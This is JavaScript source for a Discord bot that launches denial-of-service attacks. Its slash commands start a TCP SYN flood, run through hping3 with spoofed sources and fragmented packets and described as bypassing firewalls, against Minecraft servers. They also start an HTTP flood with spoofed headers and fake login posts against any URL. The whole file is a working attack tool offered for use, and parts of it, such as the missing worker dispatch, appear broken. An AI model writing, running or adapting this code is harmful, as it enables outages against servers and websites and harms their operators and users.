const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
const net = require('net');
const http = require('http');
const https = require('https');
const dgram = require('dgram');
const { exec } = require('child_process');
const os = require('os');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

// ===== CONFIG ===== //
const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const ALLOWED_USER_ID = 'YOUR_DISCORD_USER_ID';
const MAX_DURATION = 300; // 5min max (safety)
const WORKER_COUNT = Math.min(numCPUs, 12); // Use up to 12 CPU cores

// ===== DISCORD BOT SETUP ===== //
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const activeAttacks = new Map();

// ===== FIREWALL-BYPASS TECHNIQUES ===== //
function generateFakeMinecraftHandshake(ip, port) {
    const protocolVersion = Buffer.from([0x00]); // Fake MC handshake
    const serverAddress = Buffer.from(ip);
    const serverPort = Buffer.from([port >> 8, port & 0xFF]);
    const nextState = Buffer.from([0x02]); // Login state
    
    return Buffer.concat([
        protocolVersion,
        Buffer.from([serverAddress.length]),
        serverAddress,
        serverPort,
        nextState
    ]);
}

function randomTTL() {
    return Math.floor(Math.random() * 64) + 64; // Random TTL (64-128)
}

// ===== TCP SYN FLOOD (FIREWALL BYPASS) ===== //
function tcpSynFlood(ip, port, duration, attackId) {
    if (os.platform() === 'linux') {
        // NUCLEAR OPTION (requires root)
        exec(`timeout ${duration} hping3 --flood --syn --rand-source -p ${port} --ttl ${randomTTL()} --frag --data ${generateFakeMinecraftHandshake(ip, port).length} ${ip}`, (err) => {
            if (err && !err.killed) console.error('HPING3 Error:', err);
            process.exit();
        });
    } else {
        // Fallback (Node.js raw sockets)
        const interval = setInterval(() => {
            if (activeAttacks.get(attackId)?.stopped) {
                clearInterval(interval);
                process.exit();
            }

            // Send 1000 SYN packets with spoofed SEQ/ACK
            for (let i = 0; i < 1000; i++) {
                try {
                    const socket = new net.Socket();
                    socket.setTimeout(100);
                    socket.connect({
                        host: ip,
                        port: port,
                        localAddress: `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`
                    }, () => {
                        socket.destroy(); // Half-open connection
                    });
                    socket.on('error', () => {});
                } catch (e) {}
            }
        }, 1);

        setTimeout(() => {
            clearInterval(interval);
            process.exit();
        }, duration * 1000);
    }
}

// ===== HTTP FLOOD (RATE LIMIT BYPASS) ===== //
function httpFlood(url, workers, duration, attackId) {
    const agent = url.startsWith('https') 
        ? new https.Agent({ keepAlive: true, maxSockets: 1000 })
        : new http.Agent({ keepAlive: true, maxSockets: 1000 });

    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);

    while (Date.now() < endTime && !activeAttacks.get(attackId)?.stopped) {
        for (let i = 0; i < workers; i++) {
            const req = (url.startsWith('https') ? https : http).request(url, {
                method: Math.random() > 0.5 ? 'GET' : 'POST',
                agent,
                headers: {
                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 70}.0.0.0 Safari/537.36`,
                    'X-Forwarded-For': `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`,
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache'
                }
            }, (res) => res.resume()); // Discard response

            if (req.method === 'POST') {
                req.write(`username=${Math.random().toString(36).substring(2)}&password=${Math.random().toString(36).substring(2)}`);
            }
            req.on('error', () => {}).end();
        }
    }
    process.exit();
}

// ===== DISCORD BOT COMMANDS ===== //
client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('tcp')
            .setDescription('üî• NUKE a Minecraft server (TCP SYN Flood)')
            .addStringOption(opt => opt.setName('target').setDescription('IP:PORT (e.g., 1.1.1.1:25565)').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('Seconds (max 300)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('http')
            .setDescription('üí• BRUTAL HTTP Flood')
            .addStringOption(opt => opt.setName('url').setDescription('http://example.com').setRequired(true))
            .addIntegerOption(opt => opt.setName('workers').setDescription('Number of workers (1-1000)').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('Seconds (max 300)').setRequired(true))
    ];

    client.application.commands.set(commands).catch(console.error);
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isCommand() || interaction.user.id !== ALLOWED_USER_ID) {
        return interaction.reply({ content: '‚ùå Unauthorized', ephemeral: true });
    }

    if (interaction.commandName === 'tcp') {
        const [ip, port] = interaction.options.getString('target').split(':');
        const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);

        interaction.reply({ content: `üíÄ Launching **TCP SYN FLOOD** on \`${ip}:${port}\` for ${duration} seconds...` });

        const attackId = `tcp-${Date.now()}`;
        activeAttacks.set(attackId, { stopped: false });

        if (cluster.isPrimary) {
            for (let i = 0; i < WORKER_COUNT; i++) {
                cluster.fork({
                    TYPE: 'tcp',
                    IP: ip,
                    PORT: port,
                    DURATION: duration,
                    ATTACK_ID: attackId
                });
            }
        }
        setTimeout(() => stopAttack(attackId), duration * 1000);
    } else if (interaction.commandName === 'http') {
        const url = interaction.options.getString('url');
        const workers = Math.min(Math.max(interaction.options.getInteger('workers'), 1), 1000);
        const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);

        interaction.reply({ content: `üî• Starting **HTTP FLOOD** on \`${url}\` with ${workers} workers for ${duration} seconds...` });

        const attackId = `http-${Date.now()}`;
        activeAttacks.set(attackId, { stopped: false });

        if (cluster.isPrimary) {
            for (let i = 0; i < WORKER_COUNT; i++) {
                cluster.fork({
                    TYPE: 'http',
                    URL: url,
                    WORKERS: Math.ceil(workers / WORKER_COUNT),
                    DURATION: duration,
                    ATTACK_ID: attackId
                });
            }
        }
        setTimeout(() => stopAttack(attackId), duration * 1000);
    }
});

// ===== UTILITY FUNCTIONS ===== //
function stopAttack(attackId) {
    const attack = activeAttacks.get(attackId);
    if (attack && !attack.stopped) {
        attack.stopped = true;
        if (cluster.isPrimary) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
    }
}

function randomByte() {
    return Math.floor(Math.random() * 254) + 1;
}

// ===== START BOT ===== //
client.login(BOT_TOKEN).catch(console.error);
